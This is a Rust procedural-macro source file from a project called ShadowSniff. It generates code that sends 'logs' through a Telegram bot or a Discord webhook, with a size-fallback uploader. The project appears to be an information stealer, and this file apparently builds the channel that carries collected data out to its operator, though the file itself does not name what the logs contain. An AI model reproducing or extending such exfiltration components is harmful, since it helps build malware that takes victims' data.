/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use crate::ToExpr;
use crate::send_settings::{SendSettings, UploaderUsecase};
use crate::sender_service::SenderService;
use proc_macro2::TokenStream;
use quote::quote;

impl ToExpr for SendSettings {
    fn to_expr(&self, _args: ()) -> TokenStream {
        let expr = self.expr_internal();

        quote! {
            {
                #expr
            }
        }
    }
}

impl SendSettings {
    fn expr_internal(&self) -> TokenStream {
        let base = match self.service.clone() {
            SenderService::TelegramBot(bot) => bot.to_expr(()),
            SenderService::DiscordWebhook(webhook) => webhook.to_expr(()),
        };

        let Some((service, usecase)) = self.uploader.clone() else {
            return base;
        };

        match usecase.clone() {
            UploaderUsecase::Always => service.to_expr((base,)),
            UploaderUsecase::WhenLogExceedsLimit => {
                let sender_clone = quote! { sender.clone() };
                let wrapper_tokens = service.to_expr((sender_clone,));

                quote! {
                    let sender = #base;
                    let wrapper = #wrapper_tokens;

                    sender::size_fallback::SizeFallbackSender::new(sender, wrapper)
                }
            }
        }
    }
}
